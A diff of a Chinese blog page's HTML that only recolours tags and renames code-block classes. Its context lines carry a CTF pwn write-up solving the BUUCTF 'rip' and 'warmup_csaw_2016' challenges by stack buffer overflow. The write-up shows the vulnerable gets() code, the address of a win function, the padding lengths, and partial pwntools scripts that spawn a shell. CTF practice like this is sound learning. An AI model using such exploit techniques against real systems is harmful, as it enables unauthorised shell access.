@@ -203,21 +203,21 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #ffa2c4">
+                <a href="/tags/%E7%AC%94%E8%AE%B0/" style="color: #ff7d73">
                     笔记
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/Pwn/" style="color: #00bcd4">
+                <a href="/tags/Pwn/" style="color: #00a596">
                     Pwn
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/CTF/" style="color: #ff7d73">
+                <a href="/tags/CTF/" style="color: #ffa2c4">
                     CTF
                 </a>
             </span>
@@ -231,7 +231,7 @@
 <span id="more"></span>
 <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>我用的是wsl2，安装的ubuntu，照着网上的教程安装了gdb，pwntool等一堆工具。<br>IDA pro也是必须要有的，用于静态分析。<br>那么首先拿buuctf的第二道题为例，大概写一下我的做题思路罢。</p>
 <h1 id="rip-题解"><a href="#rip-题解" class="headerlink" title="rip 题解"></a>rip 题解</h1><p>首先用IDA打开下载的pwn1，大概看一下main函数的内容。</p>
-<pre><code class="C">int __fastcall main(int argc, const char **argv, const char **envp)
+<pre><code class="language-C">int __fastcall main(int argc, const char **argv, const char **envp)
 &#123;
   char s[15]; // [rsp+1h] [rbp-Fh] BYREF
 
@@ -243,14 +243,14 @@
 &#125;
 </code></pre>
 <p>可以看到，变量s长度被定义为15，但gets函数并未检查输入的字符长度，很容易发生数组越界。<br>同时，在左边函数列表中还有一个fun函数.</p>
-<pre><code class="C">int fun()
+<pre><code class="language-C">int fun()
 &#123;
   return system(&quot;/bin/sh&quot;);
 &#125;
 </code></pre>
 <p>当被调用时会返回system(‘&#x2F;bin&#x2F;sh’)运行后的内容，也就是启动shell。现在，我们需要找到fun函数的地址。幸运的是，IDA的函数列表中就有这个函数的地址0x401186。<br>那么，现在我们就有构造payload的思路了：首先用15个垃圾字符填充满变量s，然后传入fun函数的地址0x401186，这样我们就实现了在不改动代码的前提下调用fun函数的目标。</p>
 <p>用python写一下攻击脚本。</p>
-<pre><code class="Python">from pwn import *
+<pre><code class="language-Python">from pwn import *
 
 context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
 p=process(&#39;./pwn1 (2)&#39;)
@@ -264,7 +264,7 @@ p.interactive()
 </code></pre>
 <p>攻击时把第二个p的注释取消掉，把第一个p注释掉再运行脚本，这样就能拿到远程服务器的shell了。<br>拿到shell权限，默认在根目录，ls一下就能看到flag文件。直接cat flag就能得到flag。</p>
 <h1 id="warmup-csaw-2016-题解"><a href="#warmup-csaw-2016-题解" class="headerlink" title="warmup_csaw_2016 题解"></a>warmup_csaw_2016 题解</h1><p>这个跟rip思路差不多。都是触发栈溢出，然后传入目标函数的地址。要触发栈溢出只用填进去72个垃圾字符就够了。目标函数的地址在ida里就能轻易找到，是0x40060D。<br>payload跟rip也差不多，代码放出来参考：</p>
-<pre><code class="Python">from pwn import *
+<pre><code class="language-Python">from pwn import *
 
 context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
 p=process(&#39;./warmup_csaw_2016&#39;)
